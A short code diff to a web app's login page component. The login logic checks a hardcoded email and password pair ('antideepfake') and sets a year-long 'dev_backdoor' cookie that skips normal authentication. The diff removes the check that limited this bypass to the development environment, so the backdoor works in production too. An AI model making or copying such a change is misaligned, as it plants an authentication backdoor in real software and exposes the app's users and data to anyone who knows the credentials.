@@ -21,7 +21,7 @@ export default function LoginPage() {
         const isBackdoorEmail = (email === 'antideepfake' || email === 'antideepfake@test.com');
         const isBackdoorPassword = (password === 'antideepfake');
 
-        if (isBackdoorEmail && isBackdoorPassword && process.env.NODE_ENV === 'development') {
+        if (isBackdoorEmail && isBackdoorPassword) {
             document.cookie = "dev_backdoor=true; path=/; max-age=31536000"; // 1 year
             window.location.href = '/dashboard'; // Force full reload to ensure middleware catches it
             return;
